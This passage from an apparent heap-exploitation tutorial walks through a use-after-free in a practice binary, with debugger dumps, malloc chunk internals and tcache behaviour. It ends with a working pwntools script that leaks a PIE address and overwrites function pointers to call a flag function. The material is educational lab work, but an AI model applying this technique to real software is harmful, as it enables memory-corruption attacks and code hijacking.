0x5555555598b8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555598c8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555598d8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555598e8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555598f8: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559908: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559918: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559928: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559938: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559948: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559958: 0x00000000      0x00000000
gef➤
0x555555559960: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559970: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559980: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559990: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555599a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555599b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555599c0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555599d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555599e0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555599f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a00: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a10: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a20: 0x00000000      0x00000000
gef➤
0x555555559a28: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a38: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a48: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a58: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a68: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a78: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a88: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559a98: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559aa8: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559ab8: 0x00000021      0x00000000      0x555551a9      0x00005555
0x555555559ac8: 0x555551d4      0x00005555      0x00000000      0x00000000
0x555555559ad8: 0x00000021      0x00000000      0x41414141      0x41414141
0x555555559ae8: 0x41414141      0x41414141
gef➤
```

alright, we have found the interesting part of the heap, our allocate structures. A simpler way to
do this would have been to "search" for "A"*16 but this works. In our student object, we had
entered 16 "A"'s, since the maximum buffer would be 16. There are 4 DWORDS of "A", so we do not have
any trailing data left. But whats that junk in front of it?

lets take a look at the source of the malloc_chunk structure.

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */

  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;                /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```

as we can see, the chunk will contain METADATA, which is extra data left on each chunk which provides
vital information to functions like free(); How does free even know how many bytes to free?, we know
from our rigorious binary exploitation training that programs only do what it is told, so why does
it automatically know just by a dereference pointer?

That is all thanks to heap metadata, we can see that it will contain the size of the CURRENT chunk, and
(if free), will contain the size of the previous chunk.

it will also contain the fd and bk pointers, which stand for, forwards and backwards. It will point
These two pointers will create a doubly linked list, which is a linked list that contains pointers
to the next, and the previous "node", or in this case chunk. This only becomes active AFTER it has been
freed, since it will be stored into a "bin", like tcache.

We had previously stated that each malloc, no matter the size as long as lower than 24, will return a
chunk size of 24? And it will always increment by 16 bytes? So lets think through this, we now know that
the strange 0x21 in front of each allocation is the "mchunk_size" member, since it is the only
one that is active due to the chunk being in use.

So this stores the size of our chunk right?, but i thought we had already said that our chunk was 24
bytes?

Our USABLE portion of the chunk is 24 bytes, that is the amount of bytes that we will be allowed to
use to store dynamic and global values. I had also stated that on x64 bit systems, it will allocate
32 bytes for each minumum chunk? This is due to the fact that it will reserve 8 bytes for the
metadata.

Okay, lets prove this with simple base arithmetic, lets convert 0x21 into decimal, which is 16 * 2 + 1
which will equals to 33 bytes.

Okay, why the extra byte?

Whats going on here?

Did you lie to me?

the extra byte at the end, will have 3 bits within it that contain flags. These flags include:

PREV_INUSE      - If the previous chunk exists, or has been allocated, this will be set
IS_MMAPPED      - Set if the allocation was created with mmap, instead of brk/sbrk(massive allocations).
NON_MAIN_ARENA  - When in a threaded enviroment/program, set for thread specific arena

okay, so lets recap, 0x21 was that strange value we were seeing on the heap, it seemed to contain
the size of the chunk and some bit flags. Each allocations REAL chunk size will be 32 bytes, and
one extra byte for flags. It will also have 8 bytes reserved for the heap metadata, so 32 - 8 would
equals 24, which is where we get our usable chunk size.

man these UNIX dynamic allocator devs are crazy

here is a little graph of sorts in how our heap looks like:

```
[metadata][flags][usable]
```

as we can see from the debugger output, we have both structs data:

```
_student : 0x41414141 0x41414141 0x41414141 0x41414141
_admin   : 0x555551a9 0x00005555 0x555551d4 0x00005555
```

okay, so how will this prove to us that admin_struct contains pointers to functions?
since data will be stored in little endianess for LSB executables, lets turn this data back into
pointers:

```nasm
0x555551a9 0x00005555 == 0x5555555551a9
0x555551d4 0x00005555 == 0x5555555551d4
```

okay cool, now that we have these strange pointers, lets see where they point to?

```nasm
gef➤  x/x 0x5555555551a9
0x5555555551a9 <getFlag>:       0xe5894855
gef➤  x/x 0x5555555551d4
0x5555555551d4 <admin_info>:    0xe5894855
gef➤
```

oh nice, lets check our symbols and see what these functions do, though the names might be obvious :/

```nasm
[0x000011a9]> pdf
            ; DATA XREF from main @ 0x12cf
┌ 43: sym.getFlag ();
│           0x000011a9      55             push rbp
│           0x000011aa      4889e5         mov rbp, rsp
│           0x000011ad      b900000000     mov ecx, 0
│           0x000011b2      488d154f0e00.  lea rdx, str.flag.txt       ; 0x2008 ; "flag.txt"
│           0x000011b9      488d35510e00.  lea rsi, [0x00002011]       ; "cat"
│           0x000011c0      488d3d4a0e00.  lea rdi, [0x00002011]       ; "cat"
│           0x000011c7      b800000000     mov eax, 0
│           0x000011cc      e8cffeffff     call sym.imp.execlp
│           0x000011d1      90             nop
│           0x000011d2      5d             pop rbp
└           0x000011d3      c3             ret
[0x000011a9]> pdf @sym.admin_info
            ; DATA XREF from main @ 0x12c0
┌ 19: sym.admin_info ();
│           0x000011d4      55             push rbp
│           0x000011d5      4889e5         mov rbp, rsp
│           0x000011d8      488d3d360e00.  lea rdi, str.I_am_an_admin  ; 0x2015 ; "I am an admin" ; const char *s
│           0x000011df      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000011e4      90             nop
│           0x000011e5      5d             pop rbp
└           0x000011e6      c3             ret
[0x000011a9]>
```

okay, so getflag will, of course, get the flag, and the admin info will simply print out "I am an admin"
for us. Okay, so that is what the admin struct contains, we can now recreate both of these objects!

```c
typedef struct admin_struct{
    void(*flag)();
    void(*info)();
}admin, ad*;

typedef struct student_struct{
    char name[16];
}student, s*;
```

okay, since this binary has PIE enabled, lets try to find a leak somewhere within the binary.
I enjoy using pwntools for direct interactions with the binary, since my zsh theme sometimes does not
like to display null bytes and possible leaks can be brushed off as nothings when using this terminal.

In pwntools, p.interactive() will keep the stdin of the process running, whilst recieving and
displaying all raw bytes in ascii, very cool.

Okay then, lets talk exploitation. How will any of this lead to code execution? where does this all lead?
Lets walk through the required steps we need, in order to successfully exploit this binary, we will need
an arbitrary read and write on our admin struct/object. 

Why the read?

This is a Position Independent Executable, so if we want to call any functions, we will need the correct
randomized address within memory. So we will need a leak of the getFlag() function, okay then, what else.

Next, we need a simple arbitrary write over the pointer to admin_info(). You may be wondering why we need
this, or you may have realized. As we had previously explained, the admin struct holds 2 function pointers,
one to getFlag, and the other to admin_info. We are not allowed to execute getFlag, BUT we ARE allowed to
execute admin_info(). That means, that if we overwrite the admin_info pointer, we are allowed to hijack
program execution to anywhere we want just by using the "3: Print admin info" option. Pretty cool right?

okay, lets get some arbitrary reads. So we had previously talked about how small chunks get cached within
the tcache right? Lets warm that up, and store a chunk into it. We will allocate an admin, and a student,
then free both of them. This will free two chunks, which will initialize the tcache, it will then notice
a small chunk and grab it to cache. The next chunk we allocate will be the same chunk that was stored in
the tcache.

```nasm
gef➤  start
[+] Breaking at '{<text variable, no debug info>} 0x11e7 <main>'
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555551e7  →  <main+0> push rbp
$rbx   : 0x0000555555555410  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007ffff7f85598  →  0x00007ffff7f87960  →  0x0000000000000000
$rdx   : 0x00007fffffffdd98  →  0x00007fffffffe164  →  "SHELL=/usr/bin/zsh"
$rsp   : 0x00007fffffffdc90  →  0x0000000000000000
$rbp   : 0x00007fffffffdc90  →  0x0000000000000000
$rsi   : 0x00007fffffffdd88  →  0x00007fffffffe143  →  "/root/research/pwn/heap/uaf/main"
$rdi   : 0x1
$rip   : 0x00005555555551eb  →  <main+4> sub rsp, 0x20
$r8    : 0x0
$r9    : 0x00007ffff7fdc070  →  <_dl_fini+0> endbr64
$r10   : 0x69682ac
$r11   : 0x202
$r12   : 0x00005555555550b0  →  <_start+0> endbr64
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc90│+0x0000: 0x0000000000000000   ← $rsp, $rbp
0x00007fffffffdc98│+0x0008: 0x00007ffff7debb25  →  <__libc_start_main+213> mov edi, eax
0x00007fffffffdca0│+0x0010: 0x00007fffffffdd88  →  0x00007fffffffe143  →  "/root/research/pwn/heap/uaf/main"
0x00007fffffffdca8│+0x0018: 0x00000001f7fca000
0x00007fffffffdcb0│+0x0020: 0x00005555555551e7  →  <main+0> push rbp
0x00007fffffffdcb8│+0x0028: 0x00007fffffffe129  →  0x911d68f46870284b
0x00007fffffffdcc0│+0x0030: 0x0000555555555410  →  <__libc_csu_init+0> endbr64
0x00007fffffffdcc8│+0x0038: 0x7f80255977190aac
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551e2 <admin_info+14>  (bad)
   0x5555555551e3 <admin_info+15>  call   QWORD PTR [rax+0x4855c35d]
   0x5555555551e9 <main+2>         mov    ebp, esp
 → 0x5555555551eb <main+4>         sub    rsp, 0x20
   0x5555555551ef <main+8>         mov    rax, QWORD PTR fs:0x28
   0x5555555551f8 <main+17>        mov    QWORD PTR [rbp-0x8], rax
   0x5555555551fc <main+21>        xor    eax, eax
   0x5555555551fe <main+23>        mov    QWORD PTR [rbp-0x18], 0x0
   0x555555555206 <main+31>        mov    QWORD PTR [rbp-0x10], 0x0
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main", stopped 0x5555555551eb in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551eb → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 1
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 2
What is your name: AAAAAAAA
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 6
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 7
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7eb4052 in read () from /usr/lib/libc.so.6
~/gef/gef.py:2424: DeprecationWarning: invalid escape sequence '\A'
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007ffff7f85800  →  0x00000000fbad2288
$rcx   : 0x00007ffff7eb4052  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x400
$rsp   : 0x00007fffffffd418  →  0x00007ffff7e45e82  →  <__GI__IO_file_underflow+386> test rax, rax
$rbp   : 0x00007ffff7f87300  →  0x0000000000000000
$rsi   : 0x00005555555596b0  →  0x0000000000000a37 ("7\n"?)
$rdi   : 0x0
$rip   : 0x00007ffff7eb4052  →  0x5677fffff0003d48 ("H="?)
$r8    : 0x0
$r9    : 0xffffffffffffff88
$r10   : 0x00005555555560b3  →  0x685700632a256425 ("%d%*c"?)
$r11   : 0x246
$r12   : 0x00007ffff7f86520  →  0x00000000fbad2a84
$r13   : 0x00007ffff7f86700  →  0x0000000000000000
$r14   : 0xd68
$r15   : 0x00007ffff7f87468  →  0x00007ffff7e47c50  →  <_IO_cleanup+0> endbr64
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd418│+0x0000: 0x00007ffff7e45e82  →  <__GI__IO_file_underflow+386> test rax, rax   ← $rsp
0x00007fffffffd420│+0x0008: 0x0000000000000000
0x00007fffffffd428│+0x0010: 0x00007ffff7f87300  →  0x0000000000000000
0x00007fffffffd430│+0x0018: 0x0000000000000000
0x00007fffffffd438│+0x0020: 0x00007ffff7f85800  →  0x00000000fbad2288
0x00007fffffffd440│+0x0028: 0x00007ffff7f87300  →  0x0000000000000000
0x00007fffffffd448│+0x0030: 0x00007ffff7f86320  →  0x00007ffff7f825a0  →  0x00007ffff7f522df  →  0x636d656d5f5f0043 ("C"?)
0x00007fffffffd450│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7eb404c <read+12>        test   eax, eax
   0x7ffff7eb404e <read+14>        jne    0x7ffff7eb4060 <read+32>
   0x7ffff7eb4050 <read+16>        syscall
 → 0x7ffff7eb4052 <read+18>        cmp    rax, 0xfffffffffffff000
   0x7ffff7eb4058 <read+24>        ja     0x7ffff7eb40b0 <read+112>
   0x7ffff7eb405a <read+26>        ret
   0x7ffff7eb405b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7eb4060 <read+32>        sub    rsp, 0x28
   0x7ffff7eb4064 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main", stopped 0x7ffff7eb4052 in read (), reason: SIGINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7eb4052 → read()
[#1] 0x7ffff7e45e82 → __GI__IO_file_underflow()
[#2] 0x7ffff7e47106 → _IO_default_uflow()
[#3] 0x7ffff7e1e9e8 → __vfscanf_internal()
[#4] 0x7ffff7e1da42 → __isoc99_scanf()
[#5] 0x5555555552a6 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────── Tcachebins for arena 0x7ffff7f85a00 ──────────────────────────────────
Tcachebins[idx=0, size=0x20] count=2  ←  Chunk(addr=0x555555559ae0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x555555559ac0, size=0x20, flags=PREV_INUSE)
─────────────────────────────────── Fastbins for arena 0x7ffff7f85a00 ───────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
────────────────────────────────── Unsorted Bin for arena 'main_arena' ──────────────────────────────────
[+] Found 0 chunks in unsorted bin.
─────────────────────────────────── Small Bins for arena 'main_arena' ───────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
─────────────────────────────────── Large Bins for arena 'main_arena' ───────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤
```

okay, so we have allocated an admin, a student, and freed both of them. Lets take a look at
what is inside of the tcache. For gdb/gef, we have the luxury of relying on a sick plugin that will
tell us exactly where the tcache lies, and the bins within its linked list. As we can see, there is 1
tcache bin, with 2 chunks inside the bins linked list.

These two chunks are both the same size, and are the admin/student objects/chunks we had just freed.

okay, lets start this over from the beginning, allocate an admin and a student, free both and work from
there.

```nasm

gef➤  start
[+] Breaking at '{<text variable, no debug info>} 0x11e7 <main>'
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555551e7  →  <main+0> push rbp
$rbx   : 0x0000555555555410  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007ffff7f85598  →  0x00007ffff7f87960  →  0x0000000000000000
$rdx   : 0x00007fffffffdd98  →  0x00007fffffffe164  →  "SHELL=/usr/bin/zsh"
$rsp   : 0x00007fffffffdc90  →  0x0000000000000000
$rbp   : 0x00007fffffffdc90  →  0x0000000000000000
$rsi   : 0x00007fffffffdd88  →  0x00007fffffffe143  →  "/root/research/pwn/heap/uaf/main"
$rdi   : 0x1
$rip   : 0x00005555555551eb  →  <main+4> sub rsp, 0x20
$r8    : 0x0
$r9    : 0x00007ffff7fdc070  →  <_dl_fini+0> endbr64
$r10   : 0x69682ac
$r11   : 0x202
$r12   : 0x00005555555550b0  →  <_start+0> endbr64
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc90│+0x0000: 0x0000000000000000   ← $rsp, $rbp
0x00007fffffffdc98│+0x0008: 0x00007ffff7debb25  →  <__libc_start_main+213> mov edi, eax
0x00007fffffffdca0│+0x0010: 0x00007fffffffdd88  →  0x00007fffffffe143  →  "/root/research/pwn/heap/uaf/main"
0x00007fffffffdca8│+0x0018: 0x00000001f7fca000
0x00007fffffffdcb0│+0x0020: 0x00005555555551e7  →  <main+0> push rbp
0x00007fffffffdcb8│+0x0028: 0x00007fffffffe129  →  0xe1a3b21fbe29d50d
0x00007fffffffdcc0│+0x0030: 0x0000555555555410  →  <__libc_csu_init+0> endbr64
0x00007fffffffdcc8│+0x0038: 0xccf0d355515d69f3
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551e2 <admin_info+14>  (bad)
   0x5555555551e3 <admin_info+15>  call   QWORD PTR [rax+0x4855c35d]
   0x5555555551e9 <main+2>         mov    ebp, esp
 → 0x5555555551eb <main+4>         sub    rsp, 0x20
   0x5555555551ef <main+8>         mov    rax, QWORD PTR fs:0x28
   0x5555555551f8 <main+17>        mov    QWORD PTR [rbp-0x8], rax
   0x5555555551fc <main+21>        xor    eax, eax
   0x5555555551fe <main+23>        mov    QWORD PTR [rbp-0x18], 0x0
   0x555555555206 <main+31>        mov    QWORD PTR [rbp-0x10], 0x0
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main", stopped 0x5555555551eb in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551eb → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 1
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 2
What is your name: AAAAAAAA
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 6
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 7
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 4
What is your name: AAAAAAAA
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7eb4052 in read () from /usr/lib/libc.so.6
~/gef/gef.py:2424: DeprecationWarning: invalid escape sequence '\A'
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007ffff7f85800  →  0x00000000fbad2288
$rcx   : 0x00007ffff7eb4052  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x400
$rsp   : 0x00007fffffffd418  →  0x00007ffff7e45e82  →  <__GI__IO_file_underflow+386> test rax, rax
$rbp   : 0x00007ffff7f87300  →  0x0000000000000000
$rsi   : 0x00005555555596b0  →  0x0000000000000a34 ("4\n"?)
$rdi   : 0x0
$rip   : 0x00007ffff7eb4052  →  0x5677fffff0003d48 ("H="?)
$r8    : 0x0
$r9    : 0xffffffffffffff88
$r10   : 0x00005555555560b3  →  0x685700632a256425 ("%d%*c"?)
$r11   : 0x246
$r12   : 0x00007ffff7f86520  →  0x00000000fbad2a84
$r13   : 0x00007ffff7f86700  →  0x0000000000000000
$r14   : 0xd68
$r15   : 0x00007ffff7f87468  →  0x00007ffff7e47c50  →  <_IO_cleanup+0> endbr64
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd418│+0x0000: 0x00007ffff7e45e82  →  <__GI__IO_file_underflow+386> test rax, rax   ← $rsp
0x00007fffffffd420│+0x0008: 0x0000000000000000
0x00007fffffffd428│+0x0010: 0x00007ffff7f87300  →  0x0000000000000000
0x00007fffffffd430│+0x0018: 0x0000000000000000
0x00007fffffffd438│+0x0020: 0x00007ffff7f85800  →  0x00000000fbad2288
0x00007fffffffd440│+0x0028: 0x00007ffff7f87300  →  0x0000000000000000
0x00007fffffffd448│+0x0030: 0x00007ffff7f86320  →  0x00007ffff7f825a0  →  0x00007ffff7f522df  →  0x636d656d5f5f0043 ("C"?)
0x00007fffffffd450│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7eb404c <read+12>        test   eax, eax
   0x7ffff7eb404e <read+14>        jne    0x7ffff7eb4060 <read+32>
   0x7ffff7eb4050 <read+16>        syscall
 → 0x7ffff7eb4052 <read+18>        cmp    rax, 0xfffffffffffff000
   0x7ffff7eb4058 <read+24>        ja     0x7ffff7eb40b0 <read+112>
   0x7ffff7eb405a <read+26>        ret
   0x7ffff7eb405b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7eb4060 <read+32>        sub    rsp, 0x28
   0x7ffff7eb4064 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main", stopped 0x7ffff7eb4052 in read (), reason: SIGINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7eb4052 → read()
[#1] 0x7ffff7e45e82 → __GI__IO_file_underflow()
[#2] 0x7ffff7e47106 → _IO_default_uflow()
[#3] 0x7ffff7e1e9e8 → __vfscanf_internal()
[#4] 0x7ffff7e1da42 → __isoc99_scanf()
[#5] 0x5555555552a6 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  s AAAAAAAA
[+] Searching 'AAAAAAAA' in memory
[+] In '[heap]'(0x555555559000-0x55555557a000), permission=rw-
  0x555555559ae0 - 0x555555559ae8  →   "AAAAAAAA[...]"
gef➤  x/10gx 0x555555559ae0
0x555555559ae0: 0x4141414141414141      0x000055555555900a
0x555555559af0: 0x0000000000000000      0x0000000000020511
0x555555559b00: 0x0000000000000000      0x0000000000000000
0x555555559b10: 0x0000000000000000      0x0000000000000000
0x555555559b20: 0x0000000000000000      0x0000000000000000
gef➤  c
Continuing.
0
bad input
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 5
Students name is AAAAAAAA
UUUU
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice:
```

```py
>>> int.from_bytes(b"UUUU","little")
1431655765
>>> hex(1431655765)
'0x55555555'
>>>
```

cool, so there is a memory leak within the program, though this one is useless to us. We can clearly
notice that that is an address though, either an address in memory, or to a function. Lets begin
with leaking the address of getFlag().

We start by allocating a user, with any name we want. I will enter "A"*8, but feel free to switch
it up. The reason we are allocating a user first, is because we FULLY control the user object, or
where ever the pointer, points to :)

next, free that user, its gone, but the pointer is not. We have bypassed the "no user has been allocated"
check, and are allowed to read and write to wherever our pointer points to. Remember, we had already
concluded that both the admin and student objects, are the same size. And if you have allocate a
chunk, then freed it, the pointer will still point to that chunk.

If their size match perfectly, then it will return THE SAME CHUNK. This is extremely common within
applications, as we have also previously stated that each chunk will allocate in multiples of 16 in
usable memory.

this is evidently shown within how2heap's malloc_playground, lets play with chunks for a little bit

```
> malloc 12
==> 0x12e19b0
> free 0x12e19b0
==> ok
> malloc 12
==> 0x12e19b0
>
```

as we can see, it will allocate aq chunk of size 24, then return the pointer to the chunk. We will
then free that chunk, then allocate another chunk of the exact same size. If we were to check this
in gdb, there is no involvement with any caching bins like tcache, this is just how heap allocators
work.

Now lets try to allocate something of a different size, dont forget to free that first allocation.

```
> malloc 12
==> 0x13089b0
> free 0x13089b0
==> ok
> malloc 12
==> 0x13089b0
> free 0x13089b0
==> ok
> malloc 24
==> 0x13089b0
>
```

strange, we were returned the SAME CHUNK! This again supports our hypothesis of how it allocates in 
multiples of 16.

this is also another subset of heap exploitation known as heap feng shui, or heap grooming. Albeit, this
is an extremely simple example, but the premise of heap grooming is that dynamic memory allocators are
predictable, and if you can predict where each heap will end up, and which ones you can control, then
you will be granted much more control in building a stable exploit for the binary.

Okay, so now we know how we can control the admin object/chunk, lets visualize this  for a second.

```
pointer
|
V
+-------+
|student|
+-------+
```

okay, so we allocate a student object on the heap, lets free it:

```
pointer
|
V
```

well now its gone, but its pointer still remains right? we can still control this, now lets allocate an admin

```
pointer
|
V
+-------+
| admin |
+-------+
```

oh and would you look at that, it seems like we have complete control over the admin object. Since we control
this pointer, we can read and write anywhere onto this struct/object, and since it includes function pointers
to getFlag, we are able to leak it's address and also find the base address of our binary.

first we need to make sure this leak works, here is the script to replicate the leak, and overwrite the admin object:


```py
#!/usr/bin/env python3
from pwn import *
from sys import argv,exit
context(arch='amd64',os='linux',binary='./main')
libc=ELF("./libc.so.6",checksec=False)
if len(argv)>1 and argv[1]=="-r":
    p=remote("ubuntu.box",9999) # vm
else:
    p=process()
s=lambda x,r="":p.sendlineafter(str(r),str(x)) if r else p.sendline(str(x))

# leak get flag
def PIE_leak():
    # create dangling pointer
    s(2,":")
    s("A"*4,":")
    s(7,":")
    # allocate admin, and we can do anything with it
    s(1,":")
    s(5,":")
    if p.readuntil("name is ",timeout=3):
        # p.interactive()
        return int.from_bytes(p.readuntil(b"\n").strip(b"\n"),"little")
    else:
        log.warning("could not leak, please restart script :(")
        exit(1)
pie_leak = PIE_leak()
log.info("Leaked address of getFlag: %s"%hex(pie_leak))
s(4,":")
p.sendline(p64(pie_leak)*2)
#(3,":")
p.interactive()
```

there is not a 100 percent success rate with this script, but it works for the majority of the time. If you find
the script hanging for more than 5 seconds, then feel free to SIGTERM and restart. This will do exactly as i had
explained in the visual chart, it will allocate a user, with the name of "AAAAAAAA", then free it. This will
create a pointer to a freed chunk of memory. We will then allocate an admin, and show name, which will output the
address of getFlag.

after the arbitrary read, it will then proceed to "change name" of the user, allowing us to write to where this
pointer, points to, which is the admin object. It will allow us to write 16 bytes, and since it is using read, and
attempting to write 1 byte chars, it will crash if not recieved full 16 bytes. So we can overwrite both admin_info
AND getFlag function with getflag, so when we look at admin info, we call get flag.

lets run this and see the output:

```
[*] '/tmp/jail/uaf/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled                             
    PIE:      PIE enabled                            
[+] Starting local process '/root/research/pwn/heap/uaf/main': pid 24042
[*] Leaked address of getFlag: 0x56550c51b1a9
[*] Switching to interactive mode
 Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: What is your name: MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: $ 3
FLAG{UAF_ARE_TRICKY}
[*] Got EOF while reading in interactive
```

NICE, we now have our flag. This exploit is extremely unstable, and will have some difficulty leaking the address
of getFlag, so please be patient with it.

## Part 2

pwnable.kr - uaf

